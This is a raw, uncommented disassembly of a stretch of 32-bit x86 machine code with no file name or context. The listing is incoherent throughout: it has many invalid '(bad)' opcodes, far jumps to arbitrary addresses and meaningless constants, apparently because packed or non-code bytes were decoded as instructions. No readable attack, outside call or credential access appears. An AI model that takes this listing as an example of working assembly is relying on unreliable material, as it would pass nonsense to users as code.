  417127:	inc    edx
  417128:	jmp    0x4170f6
  41712a:	dec    ebp
  41712b:	mov    ecx,0x15007723
  417130:	pop    ss
  417131:	nop
  417132:	hlt    
  417133:	mov    ebx,0x3ceadd84
  417138:	fidiv  DWORD PTR ds:0xc3e9f8c5
  41713e:	leave  
  41713f:	rcl    edx,1
  417141:	add    ecx,DWORD PTR [ecx-0x7a]
  417144:	ret    0x19d7
  417147:	push   edi
  417148:	sbb    DWORD PTR [edx],edi
  41714a:	jp     0x4171a3
  41714c:	fld1   
  41714e:	outs   dx,DWORD PTR ds:[esi]
  41714f:	(bad)  
  417150:	fidivr WORD PTR [edx]
  417152:	fidivr DWORD PTR [esi+0xc3fe574]
  417158:	mov    bl,0x86
  41715a:	xlat   BYTE PTR ds:[ebx]
  41715b:	push   es
  41715c:	jae    0x4170ea
  41715e:	mov    esp,DWORD PTR [edi-0x25]
  417161:	pop    ecx
  417162:	or     esi,DWORD PTR [eax-0x1d]
  417165:	inc    esi
  417166:	ins    BYTE PTR es:[edi],dx
  417167:	mov    eax,0x7f9ad999
  41716c:	and    eax,ebx
  41716e:	mov    bh,0x0
  417170:	mov    ebp,DWORD PTR [eax-0x573eaa8e]
  417176:	loop   0x417145
  417178:	pop    eax
  417179:	pusha  
  41717a:	jb     0x41710d
  41717c:	test   al,0x8d
  41717e:	loop   0x417138
  417180:	mov    cl,0xd4
  417182:	xchg   esi,eax
  417183:	adc    DWORD PTR ds:0xd78e522,0x618bb27e
  41718d:	test   BYTE PTR [ebp+0x76],0x68
  417191:	jo     0x417134
  417193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417194:	out    dx,al
  417195:	and    eax,0x9bf7d0d2
  41719a:	pop    ebx
  41719b:	mov    bl,0xdc
  41719d:	into   
  41719e:	cld    
  41719f:	xor    DWORD PTR ds:0x31e15c15,eax
  4171a5:	test   eax,0xa91e2917
  4171aa:	add    DWORD PTR [ecx],0x48e6e499
  4171b0:	fnstcw WORD PTR [esi]
  4171b2:	(bad)  
  4171b3:	jne    0x41717b
  4171b5:	and    al,0x20
  4171b7:	adc    eax,0xeb790c61
  4171bc:	xor    DWORD PTR [eax+edi*1-0x7e],edi
  4171c0:	or     BYTE PTR [eax],ah
  4171c2:	mov    ah,0x1
  4171c4:	jg     0x4171a2
  4171c6:	adc    ah,ah
  4171c8:	xchg   ecx,eax
  4171c9:	bound  esp,QWORD PTR [esp+ebp*2-0x2d]
  4171cd:	(bad)  
  4171ce:	pop    ecx
  4171cf:	fldcw  WORD PTR [esi+0x78]
  4171d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171d3:	test   BYTE PTR [ebx+0x7dac7f55],bl
  4171d9:	sbb    edi,DWORD PTR [eax+ebp*1-0x45]
  4171dd:	mov    edx,0x5d570250
  4171e2:	es inc eax
  4171e4:	jl     0x417169
  4171e6:	jecxz  0x417263
  4171e8:	pop    ds
  4171e9:	xchg   ebp,eax
  4171ea:	(bad)  
  4171eb:	or     BYTE PTR [edi],0x1d
  4171ee:	or     al,0xdb
  4171f0:	adc    DWORD PTR [ebx+0x78],0x23
  4171f4:	dec    edx
  4171f5:	(bad)  
  4171f6:	aas    
  4171f7:	cli    
  4171f8:	push   ds
  4171f9:	mov    cl,0x85
  4171fb:	fidivr DWORD PTR [ebx]
  4171fd:	neg    bl
  4171ff:	lods   eax,DWORD PTR ds:[esi]
  417200:	pop    edi
  417201:	pop    esi
  417202:	fstp   DWORD PTR [edx+0x2afe37d0]
  417208:	cmp    BYTE PTR [ecx-0x18b62360],dh
  41720e:	push   ds
  41720f:	aas    
  417210:	aaa    
  417211:	pop    es
  417212:	jnp    0x4171c0
  417214:	outs   dx,DWORD PTR ds:[esi]
  417215:	add    edi,DWORD PTR ss:[edi-0x1b]
  417219:	jns    0x4171ad
  41721b:	push   ebx
  41721c:	dec    esp
  41721d:	cmp    DWORD PTR [edx+eiz*4-0x7f],esi
  417221:	fwait
  417222:	aad    0x93
  417224:	push   0x9b557af1
  417229:	sahf   
  41722a:	test   BYTE PTR [ebp+0x46],bh
  41722d:	fwait
  41722e:	nop
  41722f:	jns    0x4171b8
  417231:	arpl   WORD PTR [ecx+0x7a],cx
  417234:	mov    cl,0x17
  417236:	inc    ebp
  417237:	jecxz  0x417209
  417239:	cmc    
  41723a:	or     al,0x47
  41723c:	sbb    al,0xf6
  41723e:	inc    edx
  41723f:	xchg   DWORD PTR [edi-0x75],eax
  417242:	outs   dx,DWORD PTR ds:[esi]
  417243:	xor    cl,ah
  417245:	loope  0x4171ee
  417247:	pop    esp
  417248:	cs adc bl,bh
  41724b:	pop    fs
  41724d:	xchg   DWORD PTR [ebx+0x66],edx
  417250:	sub    ecx,DWORD PTR [ebp*1-0x53dce591]
  417257:	ds push ss
  417259:	push   esi
  41725a:	pop    esp
  41725b:	sbb    ecx,DWORD PTR [ecx-0x40]
  41725e:	mov    al,ds:0x7389c808
  417263:	cmp    dx,sp
  417266:	mov    WORD PTR [ebx-0x51a6e8db],fs
  41726c:	push   0x79a0619e
  417271:	je     0x41728a
  417273:	pop    edi
  417274:	stos   DWORD PTR es:[edi],eax
  417275:	into   
  417276:	mov    ds:0xc0ab32c9,eax
  41727b:	(bad)  
  41727c:	imul   esi,DWORD PTR [ecx],0x2
  41727f:	sub    ecx,DWORD PTR [ebx+0x30]
  417282:	push   edi
  417283:	push   eax
  417284:	cmp    esp,edi
  417286:	xchg   DWORD PTR ds:0x34c00bc0,edx
  41728c:	in     eax,0x94
  41728e:	mov    WORD PTR [ecx+ebp*2+0xc],?
  417292:	push   cs
  417293:	jecxz  0x4172df
  417295:	sbb    dh,BYTE PTR [ecx-0x60b4078a]
  41729b:	add    DWORD PTR [ebx],0x41faf7f6
  4172a1:	cwde   
  4172a2:	scas   eax,DWORD PTR es:[edi]
  4172a3:	or     BYTE PTR [esi-0x4fe9cc80],dh
  4172a9:	sbb    esi,eax
  4172ab:	mov    dl,0xc2
  4172ad:	pop    es
  4172ae:	jmp    0xf53d07d0
  4172b3:	xchg   ecx,eax
  4172b4:	cmp    BYTE PTR [edx],0x6b
  4172b7:	push   eax
  4172b8:	out    0x37,al
  4172ba:	bound  ebx,QWORD PTR [esi]
  4172bc:	sahf   
  4172bd:	adc    dl,cl
  4172bf:	ror    dl,1
  4172c1:	nop
  4172c2:	sbb    DWORD PTR fs:[ebx+eiz*1-0xf],edx
  4172c7:	test   bh,0x8a
  4172ca:	or     al,0x99
  4172cc:	dec    ecx
  4172cd:	(bad)  
  4172ce:	(bad)  
  4172cf:	cmc    
  4172d0:	pop    edx
  4172d1:	jmp    0x250b:0xf41a6e43
  4172d8:	cdq    
  4172d9:	sar    BYTE PTR [esi],1
  4172db:	jae    0x417269
  4172dd:	std    
  4172de:	pop    ecx
  4172df:	push   edi
  4172e0:	cdq    
  4172e1:	imul   ebp,ebp,0x67
  4172e4:	push   ebp
  4172e5:	ficom  DWORD PTR ds:0x8981431e
  4172eb:	bound  edx,QWORD PTR [ecx-0x7f]
  4172ee:	adc    edi,DWORD PTR [edx+0x1d65e3b5]
  4172f4:	or     al,0xa7
  4172f6:	outs   dx,DWORD PTR ds:[esi]
  4172f7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f9:	aaa    
  4172fa:	dec    ebp
  4172fb:	stc    
  4172fc:	inc    ebx
  4172fd:	adc    ecx,DWORD PTR [ecx+0x43]
  417300:	adc    eax,0x1f0d7706
  417305:	cmp    ebp,esi
  417307:	cmp    cl,0x92
  41730a:	jmp    0xf853:0x6c010e1b
  417311:	ins    BYTE PTR es:[edi],dx
  417312:	mov    cl,0xed
  417314:	enter  0x5d42,0xba
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	adc    eax,0x961e5a12
  41731e:	test   DWORD PTR [edx-0x73],ebp
  417321:	jle    0x417319
  417323:	xchg   ebx,eax
  417324:	or     al,0x8d
  417326:	xchg   esp,eax
  417327:	cs inc edx
  417329:	jnp    0x4172d7
  41732b:	out    0xa0,eax
  41732d:	xchg   edi,eax
  41732e:	mov    ah,0x84
  417330:	push   ebp
  417331:	inc    esp
  417332:	fiadd  DWORD PTR [ebp+0x72]
  417335:	xor    eax,0x65b96c0c
  41733a:	in     eax,dx
  41733b:	push   ds
  41733c:	pop    ebx
  41733d:	fst    DWORD PTR ds:0x60841422
  417343:	jmp    0x41735e
  417345:	mov    cl,ch
  417347:	pop    esi
  417348:	jo     0x417348
  41734a:	stc    
  41734b:	clc    
  41734c:	mov    DWORD PTR [esi+esi*8+0x76],esp
  417350:	dec    esp
  417351:	call   0xa53e3bb2
  417356:	mov    dh,0x46
  417358:	ja     0x4172db
  41735a:	inc    esp
  41735b:	or     al,0xed
  41735d:	test   bl,dl
  41735f:	jg     0x41734d
  417361:	jecxz  0x4173b8
  417363:	push   ss
  417364:	(bad)  
  417365:	mov    WORD PTR [ebx],?
  417367:	pop    eax
  417368:	xchg   esp,eax
  417369:	xchg   DWORD PTR [ebp-0x70],esp
  41736c:	imul   DWORD PTR [eax+0x6c02d85c]
  417372:	sahf   
  417373:	sbb    DWORD PTR [ebp+0x763b84fe],0xc32f516d
  41737d:	clc    
  41737e:	sbb    dh,BYTE PTR [ebx-0x7c400872]
  417384:	xchg   ecx,eax
  417385:	(bad)  
  417386:	jle    0x417339
  417388:	out    0xd7,eax
  41738a:	push   edx
  41738b:	cwde   
  41738c:	fldenv ds:0x5630590
  417392:	ret    
  417393:	xor    DWORD PTR [edi-0x73],esi
  417396:	jne    0x417362
  417398:	lock gs pop esp
  41739b:	leave  
  41739c:	aam    0x7d
  41739e:	inc    ecx
  41739f:	or     eax,0xbff06700
  4173a4:	ds push edx
  4173a6:	call   0xbdc7:0x2d74498a
  4173ad:	ffree  st(1)
  4173af:	mov    bh,0xe1
  4173b1:	jg     0x417376
  4173b3:	fist   WORD PTR [esp+esi*2-0x5fbc6b7f]
  4173ba:	jo     0x41743a
  4173bc:	add    BYTE PTR [ebp-0x4ad2a215],bh
  4173c2:	mov    ch,0xa6
  4173c4:	fucomi st,st(4)
  4173c6:	stc    
  4173c7:	out    0x5b,al
  4173c9:	inc    ebx
  4173ca:	dec    edi
  4173cb:	xor    al,0xac
  4173cd:	(bad)  
  4173ce:	aam    0x76
  4173d0:	cdq    
  4173d1:	inc    ebp
  4173d2:	dec    ebx
  4173d3:	jp     0x4173d3
  4173d5:	les    ebx,FWORD PTR [edx*8+0x2aaa450f]
  4173dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173dd:	clc    
  4173de:	push   0x13957d34
  4173e3:	(bad)  
  4173e4:	lods   eax,DWORD PTR ds:[esi]
  4173e5:	enter  0x5b3,0x17
  4173e9:	iret   
  4173ea:	xor    DWORD PTR [edi+0x85f5592],ebx
  4173f0:	fcomi  st,st(5)
  4173f2:	hlt    
  4173f3:	icebp  
  4173f4:	xchg   ebx,eax
  4173f5:	test   al,0xb0
  4173f7:	(bad)  
  4173f8:	pop    esp
  4173f9:	ins    DWORD PTR es:[edi],dx
  4173fa:	fcomp  DWORD PTR [esi]
  4173fc:	sub    esp,DWORD PTR [edi]
  4173fe:	xor    esi,ecx
  417400:	popa   
  417401:	mov    al,0x43
  417403:	div    DWORD PTR [eax+0x4d]
  417406:	add    al,0x63
  417408:	xor    BYTE PTR [eax+0x7c],ch
  41740b:	xor    eax,0xfaef0cb9
  417410:	pusha  
  417411:	cmp    ah,BYTE PTR [ecx]
  417413:	sbb    eax,0x9a62fb16
  417418:	dec    eax
  417419:	push   edi
  41741a:	in     eax,dx
  41741b:	ins    DWORD PTR es:[edi],dx
  41741c:	add    bh,bl
  41741e:	loope  0x417428
  417420:	dec    edx
  417421:	mov    esi,0xef4b73e6
  417426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417427:	mov    esp,0x841fbaae
  41742c:	push   es
  41742d:	push   ebp
  41742e:	xchg   BYTE PTR [esi+0x46],al
  417431:	jo     0x41742b
  417433:	sar    DWORD PTR [ecx+eiz*4],cl
  417436:	call   0xd5d5008e
  41743b:	jne    0x4173ff
  41743d:	pop    edi
  41743e:	or     ch,BYTE PTR [esi+eiz*1]
  417441:	sbb    al,0xeb
  417443:	loop   0x4173db
  417445:	popf   
  417446:	push   cs
  417447:	nop
  417448:	ret    
  417449:	in     al,dx
  41744a:	sahf   
  41744b:	out    0xb3,eax
  41744d:	ret    
  41744e:	xchg   DWORD PTR [ecx+0x55],ecx
  417451:	mov    cl,0xd1
  417453:	add    eax,0x44ffb8f4
  417458:	mov    eax,0xbc5efcf3
  41745d:	pusha  
  41745e:	jle    0x41747f
  417460:	add    dl,ah
  417462:	rcl    ebx,1
  417464:	das    
  417465:	sbb    al,0x8e
  417467:	mul    ebx
  417469:	mov    DWORD PTR [esi+0x9],0x9c472875
  417470:	jns    0x41740d
  417472:	xor    eax,0x37a288cd
  417477:	xchg   ecx,eax
  417478:	sbb    al,BYTE PTR [ecx-0x52cff718]
  41747e:	in     al,0x13
  417480:	out    0x74,al
  417482:	outs   dx,BYTE PTR ds:[esi]
  417483:	jb     0x417469
  417485:	inc    esi
  417486:	pusha  
  417487:	(bad)  
  417488:	leave  
  417489:	xchg   esi,eax
  41748a:	sbb    ecx,DWORD PTR [edx]
  41748c:	mul    BYTE PTR [ebx]
  41748e:	js     0x417443
  417490:	jmp    0x494838b5
  417495:	xchg   edx,eax
  417496:	cmp    DWORD PTR [eax],0xcbe1420d
  41749c:	cmp    eax,0x36bcd155
  4174a1:	icebp  
  4174a2:	inc    ebx
  4174a3:	lds    edx,FWORD PTR [ebx]
  4174a5:	inc    esi
  4174a6:	and    eax,0x3a1790f3
  4174ab:	dec    ecx
  4174ac:	(bad)  
  4174ad:	rep outs dx,BYTE PTR ds:[esi]
  4174af:	and    eax,0x4c039a6e
  4174b4:	call   0x61ca:0xf317588f
  4174bb:	je     0x4174dd
  4174bd:	test   DWORD PTR [edx+ebx*2+0x21],0x8d02bd30
  4174c5:	fwait
  4174c6:	lahf   
  4174c7:	dec    edi
  4174c8:	retf   
  4174c9:	mov    ebp,esp
  4174cb:	popf   
  4174cc:	retf   
  4174cd:	leave  
  4174ce:	mov    esi,0x3b6695ee
  4174d3:	je     0x417535
  4174d5:	outs   dx,BYTE PTR ds:[esi]
  4174d6:	scas   al,BYTE PTR es:[edi]
  4174d7:	push   es
  4174d8:	lods   eax,DWORD PTR ds:[esi]
  4174d9:	fidivr DWORD PTR [edi+0x32]
  4174dc:	mov    bh,0x42
  4174de:	fisub  DWORD PTR [esi-0x15e1094b]
  4174e4:	mov    bl,0xb0
  4174e6:	div    esi
  4174e8:	push   ecx
  4174e9:	dec    ecx
  4174ea:	mov    ebx,0xe30436ed
  4174ef:	std    
  4174f0:	dec    edx
  4174f1:	outs   dx,BYTE PTR ds:[esi]
  4174f2:	nop    DWORD PTR [edx+edx*4-0x5939bf5]
  4174fa:	pop    ds
  4174fb:	sbb    DWORD PTR [edx+0x2e5377e4],eax
  417501:	fistp  QWORD PTR [ebx]
  417503:	clc    
  417504:	and    DWORD PTR [ecx-0x4dd081c6],0x6d480c8e
  41750e:	(bad)  
  41750f:	fucomi st,st(0)
  417511:	idiv   DWORD PTR [edi-0x26]
  417514:	jbe    0x41757b
  417516:	push   edi
  417517:	or     DWORD PTR [edx],ecx
  417519:	mov    ecx,DWORD PTR [ebp-0x6a]
  41751c:	(bad)  
  41751d:	pop    ebx
  41751e:	jns    0x417597
  417520:	fiadd  WORD PTR [ecx-0x508f5e7f]
  417526:	mov    fs,WORD PTR [edx+0x4b]
  417529:	push   ecx
  41752a:	cld    
  41752b:	cwde   
  41752c:	xor    eax,0xcd59c773
  417531:	mov    ecx,0x3c831d42
  417536:	push   edi
  417537:	daa    
  417538:	xchg   DWORD PTR [ecx-0x9],edx
  41753b:	fsubr  QWORD PTR [edx+0x30]
  41753e:	inc    eax
  41753f:	std    
  417540:	stos   DWORD PTR es:[edi],eax
  417541:	add    DWORD PTR [edi+0x61],ebx
  417544:	mov    edi,0xaeb539d5
  417549:	or     DWORD PTR [ecx],esi
  41754b:	mov    ch,0x5a
  41754d:	mov    ah,0xed
  41754f:	iret   
  417550:	mov    ebp,0x9b5ed96a
  417555:	sbb    BYTE PTR [ecx],ch
  417557:	sub    DWORD PTR [esi],eax
  417559:	lock loopne 0x4174e1
  41755c:	out    0x8b,eax
  41755e:	das    
  41755f:	scas   eax,DWORD PTR es:[edi]
  417560:	cmp    esi,esi
  417562:	or     BYTE PTR [ecx],bh
  417564:	jb     0x417507
  417566:	ror    BYTE PTR [edi],0xbb
  417569:	imul   ebx,DWORD PTR [ebx+0x18],0xffffff8f
  41756d:	(bad)  
  41756e:	dec    esi
  41756f:	pop    es
  417570:	inc    ebx
  417571:	pop    edx
  417572:	jl     0x4175a5
  417574:	mov    edx,0x1faed45
  417579:	test   al,0xaf
  41757b:	pop    ebx
  41757c:	inc    edx
  41757d:	push   eax
  41757e:	shl    DWORD PTR [edx+edx*1+0x73d13e3b],cl
  417585:	mov    dh,0x77
  417587:	(bad)  
  417588:	rcl    DWORD PTR [ebx+0x3e],1
  41758b:	hlt    
  41758c:	fwait
  41758d:	dec    eax
  41758e:	jecxz  0x4175f6
  417590:	fs aas 
  417592:	push   edx
  417593:	inc    edx
  417594:	popf   
  417595:	das    
  417596:	push   cs
  417597:	jb     0x4175f2
  417599:	mov    bl,0x4e
  41759b:	(bad)  
  41759c:	mov    eax,ds:0x71d1af19
  4175a1:	aam    0x4e
  4175a3:	and    al,ch
  4175a5:	mov    eax,0x20aafb5a
  4175aa:	inc    edx
  4175ab:	sub    eax,0x77e99f3f
  4175b0:	test   al,0x68
  4175b2:	leave  
  4175b3:	retf   0x331b
  4175b6:	lock fcompp 
  4175b9:	mov    esi,0xbd107215
  4175be:	xor    eax,0xcf4f78cd
  4175c3:	test   eax,0x5cc87287
  4175c8:	ds jae 0x4175a9
  4175cb:	and    BYTE PTR [edi-0x3595febb],dh
  4175d1:	pop    ebx
  4175d2:	adc    al,0x4a
  4175d4:	xor    DWORD PTR [ebx-0x762fc902],edx
  4175da:	ins    DWORD PTR es:[edi],dx
  4175db:	int    0x89
  4175dd:	not    DWORD PTR [ecx-0x16]
  4175e0:	out    dx,al
  4175e1:	dec    eax
  4175e2:	je     0x41759c
  4175e4:	add    DWORD PTR [esi],0x56
  4175e7:	inc    ebx
  4175e8:	cmp    ch,BYTE PTR [eax]
  4175ea:	or     al,0x36
  4175ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175ed:	push   eax
  4175ee:	dec    edx
  4175ef:	pop    esp
  4175f0:	sbb    al,0x51
  4175f2:	xchg   esp,eax
  4175f3:	jnp    0x417604
  4175f5:	mov    ds:0xc2d0a161,eax
  4175fa:	push   ebx
  4175fb:	and    al,0x95
  4175fd:	adc    dl,BYTE PTR [ebx]
  4175ff:	clc    
  417600:	stc    
  417601:	dec    ecx
  417602:	dec    ebp
  417603:	rcr    edx,0x6
  417606:	icebp  
  417607:	(bad)  
  417608:	jno    0x4175c0
  41760a:	xchg   esi,eax
  41760b:	stc    
  41760c:	push   ds
  41760d:	mov    WORD PTR [ecx],?
  41760f:	mov    edi,0xf66cab36
  417614:	repz test eax,0xa73961db
  41761a:	out    dx,eax
  41761b:	sahf   
  41761c:	call   0xb343e992
  417621:	push   cs
  417622:	repnz cli 
  417624:	enter  0x2973,0xe8
  417628:	sub    DWORD PTR [ecx-0x17e80782],esi
  41762e:	ins    DWORD PTR es:[edi],dx
  41762f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417630:	(bad)  
  417631:	icebp  
  417632:	xor    esp,DWORD PTR [edx]
  417634:	test   eax,0x3ebee4de
  417639:	es loopne 0x4175e1
  41763c:	mov    BYTE PTR [ecx],bl
  41763e:	sar    DWORD PTR [edx-0x715735a3],0xcc
  417645:	sub    al,0x21
  417647:	mov    edi,0xdce986c0
  41764c:	cmp    BYTE PTR [ecx],dl
  41764e:	shl    DWORD PTR [ecx-0x74],cl
  417651:	cli    
  417652:	cmp    al,dl
  417654:	pusha  
  417655:	dec    ebx
  417656:	xor    ch,ch
  417658:	xchg   ecx,eax
  417659:	inc    edi
  41765a:	push   0xffffff9f
  41765c:	pop    ebx
  41765d:	push   eax
  41765e:	je     0x417672
  417660:	add    al,0xf5
  417662:	cmp    BYTE PTR [ebx+eiz*8],dl
  417665:	ret    0xdb5c
  417668:	ins    BYTE PTR es:[edi],dx
  417669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41766a:	sub    dl,BYTE PTR [edx+0x20c89cd9]
  417670:	fwait
  417671:	clc    
  417672:	xor    al,0x59
  417674:	mov    WORD PTR [edi+0x5f],gs
  417677:	clc    
  417678:	je     0x417674
  41767a:	xchg   esp,eax
  41767b:	mov    ecx,0x7096f428
  417680:	out    dx,al
  417681:	pop    esi
  417682:	push   0x773b4c71
  417687:	mov    ds:0xc12b9fc9,al
  41768c:	dec    ah
  41768e:	inc    eax
  41768f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417690:	pop    edi
  417691:	in     eax,dx
  417692:	sub    DWORD PTR [esi*1-0x18949515],eax
  417699:	or     dh,dl
  41769b:	add    dl,al
  41769d:	xchg   DWORD PTR [ebx],esp
  41769f:	lock lea ecx,[esi+esi*1]
  4176a3:	or     eax,0x131f1c77
  4176a8:	xor    BYTE PTR [eax+0xc70df5a],ch
  4176ae:	add    dh,BYTE PTR [eax+0x4365315f]
  4176b4:	dec    ecx
  4176b5:	xor    BYTE PTR [ebx-0x163a1842],0x3f
  4176bc:	mov    dl,0x47
  4176be:	in     eax,dx
  4176bf:	push   edi
  4176c0:	cmp    eax,ecx
  4176c2:	or     eax,0x5b8ea063
  4176c7:	popf   
  4176c8:	push   eax
  4176c9:	repz mov eax,edi
  4176cc:	add    al,0x1e
  4176ce:	push   0xaec9b54d
  4176d3:	ins    BYTE PTR es:[edi],dx
  4176d4:	fcomp  DWORD PTR [edx]
  4176d6:	out    dx,eax
  4176d7:	test   BYTE PTR [eax+0x17],dl
  4176da:	and    edx,DWORD PTR [esi-0x5f]
  4176dd:	out    dx,al
  4176de:	cmp    DWORD PTR [ecx-0x4b],0x67
  4176e2:	popf   
  4176e3:	mov    cl,0x79
  4176e5:	ffree  st(7)
  4176e7:	imul   BYTE PTR [esi-0x7d]
  4176ea:	pusha  
  4176eb:	push   ebx
  4176ec:	xlat   BYTE PTR ds:[ebx]
  4176ed:	imul   esi,DWORD PTR [edx],0x7729ed95
  4176f3:	mov    al,ds:0x26992bc0
  4176f8:	int3   
  4176f9:	jb     0x41767c
  4176fb:	pop    esp
  4176fc:	xor    cl,BYTE PTR [edx+0x1a5cfc2]
  417702:	fcomp  QWORD PTR [eax+0x7]
  417705:	aaa    
  417706:	dec    ebp
  417707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417708:	pop    ecx
  417709:	lds    esi,FWORD PTR [esi+0xc]
  41770c:	mov    al,ds:0x71f6adcd
  417711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417712:	sbb    BYTE PTR [esp+edi*8-0x47],dh
  417716:	mov    bh,0x24
  417718:	mov    esi,0x22463fa2
  41771d:	hlt    
  41771e:	(bad)  
  41771f:	sbb    eax,0x43e01958
  417724:	inc    ebx
  417725:	xor    ah,ah
  417727:	pop    ebx
  417728:	inc    edi
  417729:	dec    eax
  41772a:	mov    BYTE PTR [eax],dh
  41772c:	inc    ebx
  41772d:	fdiv   DWORD PTR [edx]
  41772f:	push   cs
  417730:	jo     0x4176c7
  417732:	xor    DWORD PTR [ebp-0x6],eax
  417735:	or     eax,0x8383fd7c
  41773a:	inc    DWORD PTR [eax+ebx*8-0x54352ef1]
  417741:	push   0xffffffae
  417743:	mov    ecx,0xa1caf4
  417748:	xlat   BYTE PTR ds:[ebx]
  417749:	xchg   ecx,eax
  41774a:	int    0xab
  41774c:	mov    esp,0x2999c8d4
  417751:	mov    ds:0xf1f9fdb6,al
  417756:	and    BYTE PTR [eax],al
  417758:	int    0x27
  41775a:	cld    
  41775b:	ja     0x4176e8
  41775d:	push   edi
  41775e:	es js  0x4177bd
  417761:	fidiv  DWORD PTR [ebp+0x204dc502]
  417767:	mov    cl,0xe3
  417769:	test   DWORD PTR es:[esp+ebp*4+0x71],eax
  41776e:	ficomp WORD PTR [esi-0x3c]
  417771:	inc    ecx
  417772:	call   FWORD PTR [edi+0x62872286]
  417778:	mov    gs,WORD PTR [ebx+esi*8-0x20a9d79c]
  41777f:	gs mov edx,0xb79e1fa8
  417785:	push   ecx
  417786:	push   edx
  417787:	sti    
  417788:	pop    eax
  417789:	rol    DWORD PTR ds:0xcf05614a,cl
  41778f:	fisub  DWORD PTR [ebx]
  417791:	loope  0x417768
  417793:	mov    edi,DWORD PTR [esi+eiz*1]
  417796:	inc    edi
  417797:	adc    eax,0xd5e91151
  41779c:	xchg   esi,eax
  41779d:	pop    edi
  41779e:	inc    esp
  41779f:	mov    edx,0x1bbae8e8
  4177a4:	stos   BYTE PTR es:[edi],al
  4177a5:	lds    eax,FWORD PTR [ecx+0x4f]
  4177a8:	xor    dh,BYTE PTR [ebx]
  4177aa:	jecxz  0x417811
  4177ac:	or     ah,bl
  4177ae:	in     eax,0xe5
  4177b0:	scas   al,BYTE PTR es:[edi]
  4177b1:	shl    BYTE PTR [esi],1
  4177b3:	xchg   esi,eax
  4177b4:	repnz push edx
  4177b6:	repz hlt 
  4177b8:	lods   al,BYTE PTR ds:[esi]
  4177b9:	jl     0x41775f
  4177bb:	xor    bl,BYTE PTR [edi-0x62]
  4177be:	sbb    BYTE PTR [edx-0x1b],ah
  4177c1:	xor    esp,0xfffffffd
  4177c4:	pop    esp
  4177c5:	mov    dh,ch
  4177c7:	push   edi
  4177c8:	mov    ebx,0xfc869615
  4177cd:	stos   DWORD PTR es:[edi],eax
  4177ce:	sub    BYTE PTR [ebx],0x9a
  4177d1:	pop    ss
  4177d2:	dec    ebp
  4177d3:	gs pop ebp
  4177d5:	aad    0x21
  4177d7:	(bad)  
  4177d8:	mov    ds:0xb3c86df3,eax
  4177dd:	jne    0x4177c3
  4177df:	sub    eax,0x2ff991ac
  4177e4:	(bad)  
  4177e6:	jecxz  0x417853
  4177e8:	int    0x83
  4177ea:	xlat   BYTE PTR ds:[ebx]
  4177eb:	out    0x62,eax
  4177ed:	pop    edx
  4177ee:	inc    edx
  4177ef:	jl     0x417852
  4177f1:	xchg   ebx,eax
  4177f2:	dec    esp
  4177f3:	mov    ah,0x12
  4177f5:	sahf   
  4177f6:	aaa    
  4177f7:	push   edi
  4177f8:	adc    ah,BYTE PTR [eax-0x18]
  4177fb:	push   eax
  4177fc:	lods   al,BYTE PTR ds:[esi]
  4177fd:	lock cwde 
  4177ff:	loop   0x417873
  417801:	sbb    eax,0xa88a242b
  417806:	and    DWORD PTR [eax],esp
  417808:	inc    edx
  41780a:	stos   DWORD PTR es:[edi],eax
  41780b:	(bad)  
  41780c:	out    dx,eax
  41780d:	idiv   DWORD PTR [eax+0x15]
  417810:	nop
  417811:	outs   dx,BYTE PTR ds:[esi]
  417812:	nop
  417813:	mov    fs,WORD PTR [eax+0x5d]
  417816:	push   eax
  417817:	lahf   
  417818:	aaa    
  417819:	and    DWORD PTR [eax],0x6f7a449e
  41781f:	in     eax,0x97
  417821:	mov    edi,0xbd477ca8
  417826:	rol    DWORD PTR [ebp-0x6777d07d],0xea
  41782d:	inc    edx
  41782e:	cs in  eax,0xb3
  417831:	fld    TBYTE PTR [eax+0x64]
  417834:	and    eax,0xc311b22a
  417839:	mov    ecx,0x8bff6234
  41783e:	outs   dx,DWORD PTR ds:[esi]
  41783f:	enter  0xd3d4,0xe3
  417843:	cmp    DWORD PTR [esi-0x31],edx
  417846:	push   ds
  417847:	loop   0x4177d6
  417849:	out    0x44,eax
  41784b:	stc    
  41784c:	test   BYTE PTR [edx],dl
  41784e:	mov    cl,BYTE PTR [ebx+ebx*8+0x6c7d2164]
  417855:	fild   WORD PTR [ecx-0xffedaa7]
  41785b:	add    esp,DWORD PTR [ecx]
  41785d:	cmp    dl,ah
  41785f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417860:	nop
  417861:	push   0x6f
  417863:	fmul   DWORD PTR [edi+0x5bc853d9]
  417869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41786a:	inc    ebx
  41786b:	fs mov edx,0xef24bfce
  417871:	aam    0x5
  417873:	mov    al,0x1a
  417875:	test   bh,0x20
  417878:	sub    eax,0xe2f3e6ed
  41787d:	jmp    0x6879168f
  417882:	xor    eax,esp
  417884:	(bad)  
  417885:	cmc    
  417886:	aad    0x4f
  417888:	jne    0x4178ff
  41788a:	jne    0x417884
  41788c:	outs   dx,DWORD PTR ds:[esi]
  41788d:	leave  
  41788e:	pop    edi
  41788f:	daa    
  417890:	js     0x417871
  417892:	sti    
  417893:	in     al,dx
  417894:	and    ebp,DWORD PTR [ebx]
  417896:	sti    
  417897:	dec    eax
  417898:	and    DWORD PTR [esi+edx*1-0x72],ebx
  41789c:	stos   DWORD PTR es:[edi],eax
  41789d:	in     al,0xc2
  41789f:	icebp  
  4178a0:	popa   
  4178a1:	lds    ebp,FWORD PTR [ecx-0x5a]
  4178a4:	mov    cl,0xd5
  4178a6:	icebp  
  4178a7:	sub    BYTE PTR [ebp+0x7b],bh
  4178aa:	mov    esi,0x9d44ddaf
  4178af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178b0:	push   ebx
  4178b1:	and    al,0x8f
  4178b3:	(bad)  
  4178b4:	xor    eax,0xaaac72a4
  4178b9:	adc    al,0x66
  4178bb:	pop    ebp
